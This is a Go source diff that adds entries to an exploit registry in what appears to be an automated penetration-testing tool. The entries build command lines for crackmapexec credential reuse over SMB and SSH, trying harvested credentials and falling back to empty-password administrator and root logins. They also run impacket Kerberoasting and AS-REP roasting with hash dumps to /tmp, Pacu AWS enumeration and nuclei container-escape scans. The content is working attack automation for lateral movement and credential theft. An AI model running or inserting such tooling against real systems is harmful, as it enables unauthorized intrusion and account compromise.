@@ -1642,6 +1642,172 @@ var extraExploitRegistry = []ToolSpec{
 			},
 		},
 	},
+
+	// ── cred-reuse — credential reuse testing across services ────────────────
+	// After finding creds, test across SMB, SSH, and other services
+	{
+		Name: "cred-reuse", Phase: 2, Timeout: 1800,
+		VulnTypes:   []string{"all", "auth", "lateral", "ad"},
+		InstallHint: "sudo apt install crackmapexec -y",
+		InstallCmd:  "sudo apt install crackmapexec -y",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			// Test found credentials across SMB
+			user := "administrator"
+			pass := ""
+			if len(ctx.CredsFound) > 0 {
+				parts := strings.SplitN(ctx.CredsFound[0], ":", 2)
+				if len(parts) == 2 {
+					user = parts[0]
+					pass = parts[1]
+				}
+			}
+			return []string{
+				"smb", target,
+				"-u", user,
+				"-p", pass,
+				"--shares",
+				"--pass-pol",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"smb", target, "-u", "administrator", "-p", "", "--shares"}
+			},
+		},
+	},
+
+	// ── cred-reuse-ssh — SSH credential reuse ────────────────────────────────
+	{
+		Name: "cred-reuse-ssh", Phase: 2, Timeout: 600,
+		VulnTypes:   []string{"all", "auth", "lateral"},
+		InstallHint: "sudo apt install crackmapexec -y",
+		InstallCmd:  "sudo apt install crackmapexec -y",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			user := "root"
+			pass := ""
+			if len(ctx.CredsFound) > 0 {
+				parts := strings.SplitN(ctx.CredsFound[0], ":", 2)
+				if len(parts) == 2 {
+					user = parts[0]
+					pass = parts[1]
+				}
+			}
+			return []string{
+				"ssh", target,
+				"-u", user,
+				"-p", pass,
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"ssh", target, "-u", "root", "-p", ""}
+			},
+		},
+	},
+
+	// ── GetUserSPNs — Kerberoasting ───────────────────────────────────────────
+	{
+		Name: "GetUserSPNs", Phase: 4, Timeout: 600,
+		VulnTypes:   []string{"all", "ad", "postexploit", "privesc"},
+		InstallHint: "sudo apt install python3-impacket -y",
+		InstallCmd:  "sudo apt install python3-impacket -y",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			user := "administrator"
+			pass := ""
+			if len(ctx.CredsFound) > 0 {
+				parts := strings.SplitN(ctx.CredsFound[0], ":", 2)
+				if len(parts) == 2 {
+					user = parts[0]
+					pass = parts[1]
+				}
+			}
+			return []string{
+				fmt.Sprintf("%s/%s:%s", target, user, pass),
+				"-dc-ip", target,
+				"-request",
+				"-outputfile", "/tmp/cybermind_kerberoast.txt",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{fmt.Sprintf("%s/administrator:", target), "-dc-ip", target, "-request"}
+			},
+		},
+	},
+
+	// ── GetNPUsers — AS-REP Roasting ─────────────────────────────────────────
+	{
+		Name: "GetNPUsers", Phase: 4, Timeout: 600,
+		VulnTypes:   []string{"all", "ad", "postexploit", "privesc"},
+		InstallHint: "sudo apt install python3-impacket -y",
+		InstallCmd:  "sudo apt install python3-impacket -y",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				fmt.Sprintf("%s/", target),
+				"-usersfile", "/tmp/cybermind_kerbrute_users.txt",
+				"-no-pass",
+				"-dc-ip", target,
+				"-outputfile", "/tmp/cybermind_asrep.txt",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{fmt.Sprintf("%s/", target), "-no-pass", "-dc-ip", target}
+			},
+		},
+	},
+
+	// ── pacu — AWS exploitation framework ────────────────────────────────────
+	{
+		Name: "pacu", Phase: 4, Timeout: 600,
+		VulnTypes:   []string{"all", "cloud", "postexploit", "aws"},
+		InstallHint: "pip3 install pacu --break-system-packages",
+		InstallCmd:  "pip3 install pacu --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"--session", "cybermind",
+				"--module-name", "aws__enum_account",
+				"--exec",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"--session", "cybermind", "--module-name", "iam__enum_permissions", "--exec"}
+			},
+		},
+	},
+
+	// ── nuclei-container — container escape and kubernetes vulnerability checks
+	{
+		Name: "nuclei-container", Phase: 4, Timeout: 600,
+		VulnTypes:   []string{"all", "cloud", "postexploit", "rce"},
+		InstallHint: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && nuclei -update-templates",
+		InstallCmd:  "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"-t", "vulnerabilities/docker/",
+				"-t", "vulnerabilities/kubernetes/",
+				"-severity", "critical,high,medium",
+				"-silent", "-no-color",
+				"-c", "25",
+				"-o", "/tmp/cybermind_container_vulns.txt",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "-t", "vulnerabilities/", "-severity", "critical,high", "-silent", "-no-color", "-c", "10"}
+			},
+		},
+	},
 }
 
 // init merges extraExploitRegistry into exploitRegistry at startup
